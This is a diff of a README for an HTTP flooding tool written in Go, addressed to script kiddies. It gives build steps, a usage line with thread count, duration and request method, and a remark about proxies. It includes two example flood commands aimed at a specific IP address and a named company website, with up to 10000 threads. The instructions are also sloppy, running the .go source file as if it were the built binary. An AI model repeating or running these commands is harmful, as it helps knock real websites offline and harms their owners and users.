@@ -1,22 +1,22 @@
-# usage...
+INSTALL GOLANG 
 
-yo yo whats up skids
+go build potatos1233.go
 
-heres a HTTP Flooder in golang 
+go in termial
 
-```bash
-usage...
+./potatos1233.go <url> <threads> <get/post> <seconds> <header.txt/nil>
 
-first you build the go file
 
-go build filename
+you can use proxys just put em in a txt file i think idk i lwk forgot
 
-then after it should be a .exe or whatever lauch it in a termial and do this replace what you want
+example:
 
-./filename  <url> <threads> <get/post> <seconds> <header.txt/nil>
+./potatos1233.go http://61.78.164.58:8089/multi.html 600 get 600 header.txt
 
-i also provided a free header.txt
 
----
-HAVE FUN SKIDDING!!!
+./potatos1233.go https://www.leucht.com/ 10000 get  800 header.txt
+
+
           -potatos1233
+
+                    ps.if you have any questions just put em in the issues and if your here to bitch dont
